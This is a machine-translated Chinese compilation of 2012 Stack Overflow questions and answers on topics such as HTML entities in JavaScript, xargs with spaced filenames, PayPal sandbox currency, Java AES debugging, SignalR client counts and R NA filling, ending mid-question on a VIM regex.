所以我的问题是，如果有人知道为什么 JS 会那样做？喜欢`&auml;`或`&ouml;`正在转换的字符，而喜欢`&amp;`或的字符`&nbsp;`是普通的。有没有可能避免这种转换？

我设置了一个小提琴来证明这一点：[JSFiddle](http://jsfiddle.net/66zyK/)

谢谢你的帮助！

**编辑：**

也许我解释得有点混乱，对此感到抱歉。我想要的是 HTML：

`<p>l&ouml;sen &amp; gr&uuml;&szlig;en</p>`.

除了 HTML-Tags，每个特殊字符都应该不被转换。就像上面的 HTML 一样。

但是 JS 将`&ouml;`or自动转换`&uuml;`为`ö`or `ü`，这是我需要避免的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T17:02:29.500

这是因为浏览器（而不是 JavaScript）将不需要在 HTML 中转义的实体转换为它们各自的 Unicode 字符（例如，它会跳过`&amp;`和`&lt;`）`&gt;`。

因此，当您检查`.innerHTML`时，它不再包含原始页面源中的确切内容；您可以逆转此过程，但它涉及字符`<->`实体对的完整映射，这是不切实际的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T16:51:28.910

如果我理解正确，请尝试在目标元素上对 jQuery 使用 innerHTML 或 .html('your html code')

# bash - 在一个命令中通过 xargs 管道传输两个文件名（带空格）

> ID：13514252
> 
> 赞同：2
> 
> 时间：2012-11-22T13:56:26.103
> 
> 标签：bash, imagemagick, command-line-interface, ls, xargs

我经常发现自己想将我拍摄的两张最新截图合并到一张图片中。我想在一个命令行中通过 xargs (?) 使用 ImageMagick 来合并按日期排序的两个最新文件。

到目前为止，我有以下内容，但是在处理文件名中的空格时遇到了麻烦。我似乎无法弄清楚如何完成这项工作。

```
ls -t | head -n 2 | sed 's/\n/\x0/' | xargs -0 -n 2 -I images convert images -append -quality 75 combined.jpg 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T20:53:28.563

如果您安装了 GNU Parallel：

```
ls -t | head -n 2 | parallel -n 2 convert {} -append -quality 75 combined.jpg 
```

它旨在正确处理空格、'、" 和其他奇怪的字符。

查看介绍视频[http://pi.dk/1](http://pi.dk/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:04:28.477

将 sed 命令更改为`sed 's/.*/"&"/'`.

或者使用这个纯 bash 解决方案：用以下代码替换管道中的 sed 命令：

```
while read x; do echo "'$x'"; done 
```

`-0`并从 xargs 中删除该选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T02:40:04.630

**编辑：** 起初我没有看到您需要按最新文件的顺序对它们进行排序，我使用 find 提供了答案。

不幸的是 find 不允许对文件进行排序。需要一些解决方法来正确排序它们。

这是使用 find 按时间对文件进行排序的建议：

```
find -type f -printf '%T+_%p\n' | sort -r | head -n 2 |  sed 's/[^_]*_//' | tr '\n' '\0' | xargs -0 -n 2 -I images convert images -append -quality 75 
```

注意：即使文件名中有“_”或空格，此命令也可以使用。

# paypal - Paypal 沙盒，我所有的英镑交易都变成了美元交易

> ID：13514254
> 
> 赞同：1
> 
> 时间：2012-11-22T13:56:39.227
> 
> 标签：paypal, sandbox, currency

我在使用 Paypal Sandbox 时遇到了货币问题。

我正在使用沙盒测试我的网站的定期付款（数字商品、快速结帐）

一切都按预期工作。

用户点击支付。

用户被转移到贝宝快速结帐登录。

贝宝登录屏幕以正确的货币显示正确的金额，例如 10 英镑

用户登录（验证交易）

支付成功，用户返回我们的网站。

迷人的。这一切都如我所料。

但是，当我登录商家沙盒帐户检查活动时，我的测试用户支付的所有 £xx 付款现在都是 $xx（美元）

我该如何解决这个问题，或者 Sandbox 是否只支持美元，如果我上线，这个问题就会消失？

我已尝试更改我的请求中的货币（即设置 PAYMENTREQUEST_0_CURRENCYCODE = 其他内容） - 这会更改支付页面登录中的货币，但无论如何，所有付款在商家登录中仍以美元形式通过。

我在我的商家账户中设置了英镑、欧元和美元作为货币。

请求看起来像这样（除了在将请求发送到 PayPal 之前所有密钥都转换为 UC）。

```
 'L_PAYMENTREQUEST_0_AMT0' => '10.00',
      'paymentaction' => 'Sale',
      'PAYMENTREQUEST_0_CURRENCYCODE' => 'GBP',
      'l_billingtype0' => 'RecurringPayments',
      'returnUrl' => 'http://site.com',
      'brandname' => 'Name',
      'L_PAYMENTREQUEST_0_DESC0' => 'GoPro 10',
      'allownote' => 0,
      'l_billingagreementdescription0' => 'goPro 10.',
      'PAYMENTREQUEST_0_ITEMAMT' => '10.00',
      'cancelUrl' => 'http://site.com/payment/cancel/7',
      'PAYFLOWCOLOR' => '518daf',
      'PAYMENTREQUEST_0_AMT' => '10.00',
      'L_PAYMENTREQUEST_0_ITEMCATEGORY0' => 'Digital',
      'HDRIMG' => 'http://site.com/images/logo230x95.png',
      'MAXFAILEDPAYMENTS' => 0,
      'L_PAYMENTREQUEST_0_NAME0' => '10',
      'noshipping' => 1,
      'L_PAYMENTREQUEST_0_NUMBER0' => 'CR7',
      'L_PAYMENTREQUEST_0_QTY0' => 1, 
```

响应表单 paypay 是“成功”，但是如果我执行 GetRecurringPaymentsProfileDetails

然后贝宝的结果是美元。例如

```
'totalbillingcycles' => '0',
'trialamtpaid' => '0.00',
'autobilloutamt' => 'NoAutoBill',
'ack' => 'Success',
'desc' => 'Gift or use 110 points per month and receive 70% revenue share with goPro 10.',
'numcyclesremaining' => '0',
'amt' => '10.00',
'maxfailedpayments' => '0',
'nextbillingdate' => '2012-11-22T10:00:00Z',
'regularbillingperiod' => 'Day',
'aggregateamt' => '0.00',
'subscribername' => 'name',
'regulartotalbillingcycles' => '0',
'billingperiod' => 'Day',
'outstandingbalance' => '0.00',
'status' => 'Active',
'regularamtpaid' => '0.00',
'taxamt' => '0.00',
'regulartaxamt' => '0.00',
'failedpaymentcount' => '0',
'regularshippingamt' => '0.00',
'profileid' => 'I-616GDHNKDXKL',
'timestamp' => '2012-11-22T12:28:26Z',
'regularbillingfrequency' => '1',
'version' => '95.0',
'finalpaymentduedate' => '1970-01-01T00:00:00Z',
'build' => '4181146',
'numcyclescompleted' => '0',
'correlationid' => 'c3fc55a117agh',
'shippingamt' => '0.00',
'regularcurrencycode' => 'USD',
'regularamt' => '10.00',
'aggregateoptionalamt' => '0.00',
'profilestartdate' => '2012-11-22T00:00:00Z',
'billingfrequency' => '1',
'currencycode' => 'USD', 
```

我有什么明显的遗漏吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:25:33.320

啊，我问的太早了，看来外地

PAYMENTREQUEST_0_CURRENCYCODE 被忽略（我不知道为什么 - 它已记录在案）

你必须使用

CURRENCYCODE = GBP（记录为已弃用）。

# java - AES 解密始终为空

> ID：13514256
> 
> 赞同：0
> 
> 时间：2012-11-22T13:56:49.120
> 
> 标签：java, cryptography, aes, salt

我尝试使用 salt 来解密`AES`加密的消息，但它总是返回`null`值。谁能看看我在哪里做错了？

```
public static String decryptMessage(String encryptedMessage, String salt) {

  String decryptedMessage = null;
  String valueToDecrypt = encryptedMessage;
  try {
    Key key = generateKey();
    Cipher c = Cipher.getInstance(ALGORITHM);
    c.init(Cipher.DECRYPT_MODE, key);

    for (int i = 0; i < ITERATIONS; i++) {
      byte[] decodedValue = Base64.decodeBase64(valueToDecrypt);
      byte[] decVal = c.doFinal(decodedValue);
      decryptedMessage = new String(decVal).substring(salt.length());
      valueToDecrypt = decryptedMessage;
    }

  } catch (Exception e) {
    e.printStackTrace();

  }
  return decryptedMessage;
}

**EDIT:** 
```

这是我认为有效的相应加密方法。

```
private static final String ALGORITHM = "AES";
    private static final int ITERATIONS = 5;
    private static final byte[] keyValue = new byte[] { '1', '2', '3', '4',
            '5', '6', '7', '8', '9', '0', '1', '2', '3', '4', '5', '6' };

    public static String encryptMessage(String message, String salt) {
        String encMessage = null;
        byte[] encVal = null;
        String messageWithSalt = null;
        try {
            Key key = generateKey();

            Cipher c = Cipher.getInstance(ALGORITHM);
            c.init(Cipher.ENCRYPT_MODE, key);

            for (int i = 0; i < ITERATIONS; i++) {
                messageWithSalt = salt + encMessage;
                encVal = c.doFinal(messageWithSalt.getBytes());
                byte[] encryptedValue = new Base64().encode(encVal);
                encMessage = new String(encryptedValue);
            }

        } catch (Exception e) {
            e.printStackTrace();

        }
        return encMessage;
    } 
```

PS：迭代不是0；

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:12:12.777

我认为您的方法可能长期被破坏或命名错误。每次解密时都会生成一个密钥，而您应该有一个与用于加密的密钥匹配的预先存在的密钥。

您还传入一个“盐”值 - 注意：这是一个通常为散列保留的术语 - 然后您完全忽略它，除了使用大小作为结果的截断长度。

当然，我在上面看到的并不是以明智的方式解密任何东西。如果您能*准确*描述您想要实现的目标，我们可能会更正代码或向您指出执行该任务的同行评审方法（可能已经在标准库中实现）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T13:31:07.583

嗯，我发现了错误。它在加密方法中。 `encMessage`是`null`在加密过程开始之前。 `String encMessage = message`成功了。所以加密方法是：

```
 public static String encryptMessage(String message, String salt) {
            String encMessage = message;
            byte[] encVal = null;
            String messageWithSalt = null;
            try {
                Key key = generateKey();

                Cipher c = Cipher.getInstance(ALGORITHM);
                c.init(Cipher.ENCRYPT_MODE, key);

                for (int i = 0; i < ITERATIONS; i++) {
                    messageWithSalt = salt + encMessage;
                    encVal = c.doFinal(messageWithSalt.getBytes());
                    byte[] encryptedValue = new Base64().encode(encVal);
                    encMessage = new String(encryptedValue);
                }

            } catch (Exception e) {
                e.printStackTrace();

            }
            return encMessage;
        } 
```

# ruby - 在非活动记录 ruby 文件中导入活动记录模型

> ID：13514257
> 
> 赞同：0
> 
> 时间：2012-11-22T13:56:52.613
> 
> 标签：ruby, ruby-on-rails-3

我正在尝试`Mymodel < ActiveRecord::Base`在 ruby​​ 文件中使用活动记录模型，但 ruby​​ 文件已经在我的 Rails 应用程序的模型目录中。当我打电话时，`model = MyModel.new`我得到一个错误。我需要在纯 ruby​​ 文件中导入任何内容吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:01:31.753

如果在项目的根目录中，请尝试编写：

```
require './config/environment/' 
```

# c# - 获取连接到 SignalR 集线器的侦听器和客户端的数量

> ID：13514259
> 
> 赞同：58
> 
> 时间：2012-11-22T13:57:02.573
> 
> 标签：c#, asp.net, asp.net-mvc-3, signalr, signalr-hub

有没有办法找出侦听器的数量（连接到集线器的客户端？）

如果至少连接了一个客户端，我正在尝试运行/启动一项任务，否则不要启动它：

```
[HubName("taskActionStatus")]
public class TaskActionStatus : Hub, IDisconnect
{
    static CancellationTokenSource tokenSource;

    public void GetTasksStatus(int? siteId)
    {
        tokenSource = new CancellationTokenSource();
        CancellationToken ct = tokenSource.Token;

        ITaskRepository taskRepository = UnityContainerSetup.Container.Resolve<ITaskRepository>();

        // init task for checking task statuses
        var tasksItem = new DownloadTaskItem();
        taskRepository.GetTasksStatusAsync(siteId, tasksItem, ct);

        // subscribe to event [ listener ]
        tasksItem.Changed += new EventHandler<TaskEventArgs>(UpdateTasksStatus);
    }

    public void UpdateTasksStatus(object sender, TaskEventArgs e)
    {
        Clients.updateMessages(e.Tasks);
    }

    // when browsing away from page
    public Task Disconnect()
    {
        try
        {
            tokenSource.Cancel();
        }
        catch (Exception)
        {
            //
        }

        return null;
    }
} 
```

谢谢

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-11-22T14:01:17.470

没有办法从 SignalR 获得这个计数。您必须使用 Hub 上的`OnConnect()`和`OnDisconnect()`方法来自己保持计数。

使用静态类保存计数的简单示例：

```
public static class UserHandler
{
    public static HashSet<string> ConnectedIds = new HashSet<string>();
}

public class MyHub : Hub
{
    public override Task OnConnectedAsync()
    {
        UserHandler.ConnectedIds.Add(Context.ConnectionId);
        return base.OnConnectedAsync();
    }

    public override Task OnDisconnectedAsync(Exception exception)
    {
        UserHandler.ConnectedIds.Remove(Context.ConnectionId);
        return base.OnDisconnectedAsync(exception);
    }
} 
```

然后，您从 中获取计数`UserHandler.ConnectedIds.Count`。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2015-09-25T15:31:29.793

对于版本 2.1.1< 它应该是：

```
public static class UserHandler
{
    public static HashSet<string> ConnectedIds = new HashSet<string>();
}

public class MyHub : Hub
{
    public override Task OnConnected()
    {
        UserHandler.ConnectedIds.Add(Context.ConnectionId);
        return base.OnConnected();
    }

    public override Task OnDisconnected(bool stopCalled)
    {
        UserHandler.ConnectedIds.Remove(Context.ConnectionId);
        return base.OnDisconnected(stopCalled);
    }
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2019-07-24T08:46:05.550

在 SIGnalR（2.4.1 版）中，这相当容易：

```
public int GetOnline()
{
   return GlobalHost.DependencyResolver.Resolve<ITransportHeartbeat>().GetConnections().Count;
} 
```

只需从客户端调用此方法（：

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2018-10-09T17:56:59.930

现在你需要：

```
public override Task OnConnectedAsync()
{
    UserHandler.ConnectedIds.Add(Context.ConnectionId);

    return base.OnConnectedAsync();
}

public override Task OnDisconnectedAsync(Exception exception)
{
    UserHandler.ConnectedIds.Remove(Context.ConnectionId);
    return base.OnDisconnectedAsync(exception);
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-09-16T22:14:40.243

我想补充一点，如果您使用 Azure Functions 和 Azure SignalR Service 的无服务器解决方案，则会出现以下已解决问题：[https ://github.com/Azure/azure-functions-signalrservice-extension/issues/54](https://github.com/Azure/azure-functions-signalrservice-extension/issues/54)

它指的是这个示例，您可以在其中使用事件网格来获取连接的实时计数，非常棒。[https://github.com/aspnet/AzureSignalR-samples/tree/master/samples/EventGridIntegration](https://github.com/aspnet/AzureSignalR-samples/tree/master/samples/EventGridIntegration)

# java - 在 MAPPER XML 的 SELECT 语句中传递多个参数

> ID：13514260
> 
> 赞同：0
> 
> 时间：2012-11-22T13:57:04.053
> 
> 标签：java, xml, spring, ibatis, mybatis

我正在使用 MyBatis 和 Spring 框架。我有一个 DB Table STORE，它有一些字段。我需要使用表中的 2 个字段（例如名称和 ID）从表中获取记录。

```
select * from STORE where Name="Mels" & Id=123 
```

我正在为表使用 MAPPER 接口。MAPPER XML 包含查询。

对于单个参数查询，我可以使用以下..

```
<select id="findAllSTOREByName"  parameterType="java.lang.String" resultMap="com.StoreObject">
select * from "STORE" where "NAME" = #{name}
</select> 
```

现在，我如何像前面提到的情况一样使用 2 个不同的 DataType 传递多个参数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T12:25:40.967

您必须使用可以存储您的数据（名称和 ID）的类的对象，这可以是哈希图或任何其他数据类。

在调用您的 select 语句之前，将参数放入 hashmap 或任何其他数据类中，并在 select 中使用您的值的名称（它存储在 hashmap 的键字段或使用的类的属性名称中）

小片段：

```
 HashMap<String, Object> values = new HashMap<String, Object>();
    values.put("id", 123);
    values.put("name", "Mels"); 
```

...调用 findAllStoreByName 并将哈希图作为参数

将您的选择更改为以下内容：

```
 <select id="findAllSTOREByName"  parameterClass="hashmap"     resultMap="com.StoreObject">
        select * from "STORE" where NAME = #name# and id = #id#
    </select> 
```

# delphi - Delphi：如何为自定义组件创建额外的设计时菜单？

> ID：13514265
> 
> 赞同：2
> 
> 时间：2012-11-22T13:57:17.803
> 
> 标签：delphi, menu, ide, delphi-xe2

我最近重新编译了 TDBGrid 组件，以实现几个自定义功能，尽管我注意到额外的设计时上下文菜单项“列编辑器”的功能现在已经消失了。

![http://i121.photobucket.com/albums/o210/R33_m/Columns.png](../Images/93fddb7413a32c72dce5709653a3616b.png)

我找不到任何可以在原始`Vcl.DBGrids`单元中创建此菜单的代码，并且在网上寻找有关如何执行此操作的解决方案时运气不佳。

这也适用于双击。它曾经调用 Columns Editor，现在它只是创建 OnCellClick 事件。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-22T14:18:43.357

在组件的设计时包中，实现组件编辑器：

```
type
  TMyComponentEditor = class(TComponentEditor)
    procedure ExecuteVerb(Index: Integer); override;
    function GetVerb(Index: Integer): string; override;
    function GetVerbCount: Integer; override;
  end;

procedure TMyComponentEditor.ExecuteVerb(Index: Integer);
begin
  case Index of
  0:
    Beep;
  end;
end;

function TMyComponentEditor.GetVerb(Index: Integer): string;
begin
  Result := 'Beep';
end;

function TMyComponentEditor.GetVerbCount: Integer;
begin
  Result := 1;
end; 
```

您还需要注册此组件编辑器。调用`RegisterComponentEditor`您的`Register`程序来执行此操作：

```
RegisterComponentEditor(TMyComponent, TMyComponentEditor); 
```

# r - 用相邻值替换 R 向量中的 NA

> ID：13514266
> 
> 赞同：0
> 
> 时间：2012-11-22T13:57:28.503
> 
> 标签：r, vector, replace

我有一个数据框，它合并了足球赛季的球员和球队数据所以对于特定赛季的特定球员，我有类似的数据

```
df <- data.frame(team=c(NA,"CRP",NA,"CRP","CRP",NA),
             player=c(NA,"Ed",NA,"Ed","Ed",NA),
             playerGame= c(NA,1,NA,2,3,NA),
             teamGame =c(1,2,3,4,5,6)) 
```

NA 表明该球员没有出现在该特定团队比赛中

我如何最有效地分别用“CRP”和“Ed”替换团队和球员的NA，并在这种情况下获得0、1、1、2、3、3的plGame输出

* * *

**编辑**

抱歉，我在半夜醒来时写了这篇文章，可能过于简化了我的问题。似乎只有一个人意识到这是一组更大数据的一个子集，即使他/她也没有遵循这一事实，尽管直接硬代码替换球员和球队是不够的 感谢您的回复。Dsee 对 zoo 包中的 na.locf 的提示和 AK 答案的第一行似乎提供了最好的前进方式

```
df$playerGame[df$teamGame == min(df$teamGame) & is.na(df$playerGame) == TRUE] <- 0
na.locf(df$playerGame) 
```

这涵盖了启动序列的多个 NA 的可能性。在我的情况下， min(df$teamGame) 将始终为 1，因此硬编码可能会加快速度

一个更现实的例子是here

```
library(zoo)
library(plyr)

newdf <- data.frame(team=c("CRP","CRP","CRP","CRP","CRP","CRP","TOT","TOT","TOT"),
             player=c(NA,"Ed",NA,"Bill","Bill",NA,NA,NA,"Tom"),
             playerGame= c(NA,1,NA,1,2,NA,NA,NA,1),
             teamGame =c(1,2,3,1,2,3,1,2,3)) 
```

我现在可以为每一行显示球队每支球队在一个赛季中打三场比赛。Ed 和 Bill，为 CRP 效力，分别出现在第 2 场和第 1,2 场比赛中。汤姆只在第 3 场比赛中为 TOT 效力。假设玩家名称是唯一的（即使在现实世界的数据中）

在我看来，我需要创建另一列“playerTeam”

```
newdf$playerTeam <- 0

for (i in 1:nrow(newdf)) {
newdf$playerTeam[i] <-ceiling(i/3)
} 
```

然后我可以使用这个值来填补玩家的空白。我使用了省略 NA 的排序函数

```
newdf <- ddply(newdf,.(playerTeam),transform,player=sort(player)[1]) 
```

然后我可以使用上述代码

```
newdf$playerGame[newdf$teamGame == 1 & is.na(newdf$playerGame) == TRUE] <- 0
newdf$playerGame <- na.locf(newdf$playerGame)

   team player playerGame teamGame playerTeam
1  CRP     Ed          0        1          1
2  CRP     Ed          1        2          1
3  CRP     Ed          1        3          1
4  CRP   Bill          1        1          2
5  CRP   Bill          2        2          2
6  CRP   Bill          2        3          2
7  TOT    Tom          0        1          3
8  TOT    Tom          0        2          3
9  TOT    Tom          1        3          3 
```

我也需要在赛季中建造，但这应该不是问题

我在这里错过了什么吗？

我有几十万行要处理，所以任何加速都会有所帮助。例如，我可能想避免 ddply 并使用 data.table 方法或其他应用函数，对

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:58:09.173

您想要的似乎有两个部分：

1.  您想用预先确定的值替换球员姓名和球队
2.  您希望通过 playerGame 列表结转游戏计数

对于 (1)，您可以执行以下操作：

```
df$team[is.na(df$team)] <- 'CRP' 
```

同样，您可以更改数据框的其他组件

对于 (2) 你可以这样做：

```
if(is.na(df$playerGame[1])) {
    df$playerGame[1] <- 0
}
for(i in 2:length(df$playerGame)) { 
    if(is.na(x[i])) {
        df$playerGame[i] <- df$playerGame[i-1]
    }
} 
```

然后`df$playerGame`是：

```
[1] 0 1 1 2 3 3 
```

也许有一种非常漂亮的方法可以做到这一点，但这显然是可读的......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:40:46.720

选择 NA，例如`player`，使用

```
 df$player[is.na(df$player)] 
```

然后为这些用途分配一个值

```
 df$player[is.na(df$player)]  <- "Ed" 
```

如果您只想为整个播放器列分配相同的名称，则无需选择任何值：

```
 df$player[]  <-  "Ed"   # you can omit the brackets [], which are shown just for emphasis 
```

* * *

然后你可以为`df$team`

* * *

附带说明一下，当您创建数据框时，如果您计划添加其他值而不是已经存在的值，您可能需要添加`stringsAsFactors=FALSE`

```
 data.frame( . , stringsAsFactors=FALSE) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T15:48:35.963

替换团队和球员的 NA：

```
df$team[is.na(df$team)] <- "CRP"
df$player[is.na(df$player)] <- "Ed" 
```

可能有一种更有效的方法来获取相邻值，但是可行。

如果第一个或/和最后一个值为 NA，如您的示例所示，我必须使用另外两行：

```
df$playerGame[df$teamGame == min(df$teamGame) & is.na(df$playerGame) == TRUE] <- 0
df$playerGame[df$teamGame == max(df$teamGame) & is.na(df$playerGame) == TRUE] <- max(df$playerGame, na.rm = TRUE) 
```

对于所有其他观察，这将获得相邻值：

```
df$playerGame[is.na(df$playerGame) == TRUE] <- df$playerGame[-1]

df

team player playerGame teamGame
CRP     Ed          0        1
CRP     Ed          1        2
CRP     Ed          1        3
CRP     Ed          2        4
CRP     Ed          3        5
CRP     Ed          3        6 
```

对于多个团队和/或玩家，我建议将其与 ddply (plyr) 结合使用。

# java - 如何将一台服务器连接到多个客户端

> ID：13514269
> 
> 赞同：0
> 
> 时间：2012-11-22T13:57:34.270
> 
> 标签：java, swing, sockets

我已经使用 ip 地址完成了一台服务器和一台客户端的通信，但被一台服务器多次通信卡住了

```
s=new ServerSocket(77);
ss=s.accept();
icon.displayMessage("New message for you", "Please click here", TrayIcon.MessageType.WARNING);     
os=ss.getOutputStream();
ps=new PrintStream(os);
is=ss.getInputStream();
br=new BufferedReader(new InputStreamReader(is));
ps.println(st);
}
catch(Exception e)
{} 
```

在客户端

```
 try
 {
 ss=new Socket(ip,77);

}
 catch(Exception e){
 }
 is=ss.getInputStream();
 br=new BufferedReader(new InputStreamReader(is));
 os=ss.getOutputStream();
 ps=new PrintStream(os);
 ps.println(msg+"  :   "+st1); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:07:21.923

您应该在单独的线程中运行每个会话，如下所示：

```
static class Session extends Thread {
    Socket s;
    Session(Socket s) {
        this.s = s;
    }
    @Override
    public void run() {
        try {
            OutputStream os = s.getOutputStream();
            // your code  
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

public static void main(String[] args) throws Exception {
    ServerSocket s = new ServerSocket(77);
    for (;;) {
        Socket ss = s.accept();
        new Session(ss).start();
    }
} 
```

这段代码只是为了解释这个想法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:04:10.233

您可以执行以下操作：

```
while (true){
    s=new ServerSocket(77);
    ss=s.accept();
    Thread at = new Thread(ss);
    at.start();
} 
```

然后与客户端的通信发生在“at”的运行方法中。

# linux - grep 和 ls：与 xargs 一起使用时，ls 不支持“l”标志？

> ID：13514275
> 
> 赞同：1
> 
> 时间：2012-11-22T13:57:46.857
> 
> 标签：linux, unix, grep, ls, xargs

当 -l 标志与 xargs 和 grep 结合传递时，为什么**ls不起作用？**

```
$ ls -rt | xargs grep xyz 
```

有效，但是：

```
$ ls -lrt | xargs grep xyz
grep: invalid option -- '-'
Usage: grep [OPTION]... PATTERN [FILE]...
Try `grep --help' for more information. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:11:43.017

因为 for 的输出`ls -l`类似于：

```
-rw-r--r-- 1 root  root  1491872 2012-11-22 03:07 Xvfb_screen0 
```

将其连接到 xargs ( `ls -l | xargs grep xyz`) 使您的 grep 命令成为

```
grep xyz -rw-r--r-- 1 root  root  1491872 2012-11-22 03:07 Xvfb_screen0 
```

它没有任何意义。

**编辑**

在这里回答@vladr 评论，因为它的格式比评论框更好。xargs 输入中的每个空格分隔文本都作为新参数传递给执行的命令，如您所见：

```
$ ls -l 
total 4
-rwxrwxr-x 1 carlos carlos 18 2012-11-22 15:17 foo

$ cat foo
#!/bin/sh
echo $#

$ ls -l | xargs ./foo
10 
```

`xargs`通过将分隔符设置为：可以按照您所说的方式行事`\n`：

```
$ ls -l | xargs -d '\n' ./foo
2 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:04:34.983

要回答您的问题，**具体来说**，请使用`ls -lrt | xargs grep xyz --`（注意`--`，这表示后面`-`出现的任何破折号都将被视为字面意思，而不是作为选项标志 - 请参阅[@CarlosCampderrós 的回答](https://stackoverflow.com/a/13514508/66516)，了解您的命令扩展为什么），但**我强烈怀疑您有正确的设置**开始，因为它**不太可能实现任何有用的东西，如使用的**。

**您更有可能**尝试`xyz`按时间倒序在所有文件中查找。如果是这样，那么使用`ls -1rt | xargs grep xyz --`（注意 dash-one `-1`，*而不是*dash-ell `-l`。）`--`在这种情况下，这是真正的可选（除非您希望一个或多个文件的名称以 dash 开头`-`。）

# javascript - js创建高级原型

> ID：13514277
> 
> 赞同：1
> 
> 时间：2012-11-22T13:58:09.210
> 
> 标签：javascript, function, prototype

我在一个项目中工作，大部分时间我都必须导入`computed style`...`html divs`所以我尝试在下创建一个自定义`prototype`，`Object`以使我的代码变得更好、更简单、更短......这是适合我的代码...

```
Object.prototype.css=function(){
    return window.getComputedStyle(this);
} 
```

什么时候`var a`是`node`一个`html div`，我需要`height`那个`div`，我必须使用`prototype`下面的...

```
a.css().height; 
```

现在的问题是......我怎样才能修改我`function`的使用`prototype`...

```
a.css.height; // css insead of css() 
```

**请不要 jQuery...**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T14:20:41.357

如果你需要它*像*一个属性一样工作，你必须放弃一些兼容性。仅现代浏览器支持[`Object.defineProperty()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/defineProperty).

这是一个例子：

```
function SomeType() {}
Object.defineProperty(SomeType.prototype, 'att', {
  get: function() {
    return this.att_;
  },
  set: function(value) {
    this.att_ = value;
  }
}); 
```

在您的情况下，您可以扩展`HTMLElement`or`HTMLDivElement`的原型。where`HTMLDivElement`的原型继承自`HTMLElement`'s. 所以你可以这样做：

```
Object.defineProperty(HTMLElement.prototype, 'css', {
  get: function(){
    return window.getComputedStyle(this);
  }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:09:54.850

在 Javascript 中，函数是第一类对象。基本上，函数定义就像任何其他变量一样。您可以将以下所有内容分配给属性：

```
a.css = "some value";
a.css = 22;
a.css = function() { return 1; }; 
```

现在，如果您尝试打印它们：

```
a.css //"some value"
a.css //22
a.css //function (){return 1;} 
```

为了调用该函数，您需要调用`a.css()`. 获得所需行为的一种方法是执行函数并将输出绑定到另一个属性。

```
Object.prototype.makeCSSProperty=function(){
    this.css = window.getComputedStyle(this);
}

a.makeCSSProperty();
a.css.height; 
```

但是，此属性将是静态的，并且仅反映运行该`makeCSSProperty()`方法时存在的样式。

# android - 从音频 Uri 获取真实路径

> ID：13514280
> 
> 赞同：1
> 
> 时间：2012-11-22T13:58:26.467
> 
> 标签：android

在我的应用程序中，用户可以使用 RingtonePreference 选择通知。从后者我可以检索所选通知的 Uri，并使用以下代码提取真实文件名：

```
private String getUriRealPath(Uri contentUri) {
    if (BuildConfig.DEBUG) {
        Log.d(TAG, "Getting real path of uri: " + contentUri.toString());
    }

    String path = null;
    final String[] projection = new String [] { MediaStore.Audio.Media.DATA };
    final Cursor cursor;

    try {
        cursor = mContext.getContentResolver().query(contentUri, projection, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            int idx = cursor.getColumnIndex(projection[0]);
             if (idx != -1) {
                 path = cursor.getString(idx);

                 if (BuildConfig.DEBUG) {
                     Log.d(TAG, "Real path is: " + path);
                 }
             }
             else {
                 if (BuildConfig.DEBUG) {
                     Log.d(TAG, "Path can't be resolved.");
                 }
             }
        }
    } catch (Exception e) {
        Log.e(TAG, "getUriRealPath - " + e);
    }

    return path;
} 
```

但是，一旦用户选择了通过第三方下载的通知，上面的代码就找不到真正的路径。提取的原因是我需要在 SoundPool 对象中播放通知的路径。

我可能看多了，但 getContentResolver() 会为我的应用程序返回一个 ContentResolver 实例。我应该使用“全局” ContentResolver 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:11:09.810

> 但是，一旦用户选择了通过第三方下载的通知，上面的代码就找不到真正的路径。

无论如何，您可能无权访问实际文件。首先，它可能不作为文件存在，而仅作为流存在。其次，它可能不在您具有读取权限的存储中。您只能通过`Uri`提供给您的媒体可靠地访问此媒体。

> 提取的原因是我需要在 SoundPool 对象中播放通知的路径。

然后您将不得不停止使用`SoundPool`并切换到`MediaPlayer`、`AudioTrack`或其他内容。

> 我应该使用“全局” ContentResolver 吗？

没有“全球” `ContentResolver`。

# regex - 我的 VIM 正则表达式搜索和替换某些代码有什么问题？

> ID：13514293
> 
> 赞同：4
> 
> 时间：2012-11-22T13:58:59.883
> 
> 标签：regex, vim

我在 php 文件中有以下代码。

```
